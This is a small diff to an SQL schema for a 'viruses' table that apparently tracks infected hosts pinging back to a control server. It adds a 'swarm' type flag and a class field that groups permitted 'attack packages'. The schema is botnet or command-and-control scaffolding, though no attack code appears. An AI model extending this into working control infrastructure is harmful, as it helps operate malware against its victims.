@@ -21,6 +21,8 @@ CREATE TABLE IF NOT EXISTS viruses (
     last_ping int not null, /* unix timestamp */
     name varchar(50) not null, /* short text of the virus, equivalent to "target name", if you will */
     active bit not null, /* whether this virus is currently active (pinging back) or not. 0 for not active, 1 for active */
+    type bit not null, /* what type is this virus? 0 for normal virus, 1 for swarm */
+    class varchar(50) not null, /* like classes in css, this just provides a grouping of attack packages, so viruses know what packages is legal. Each virus can only have 1 class */
     index (virus_id, user_handle),
     primary key (virus_id)
 );
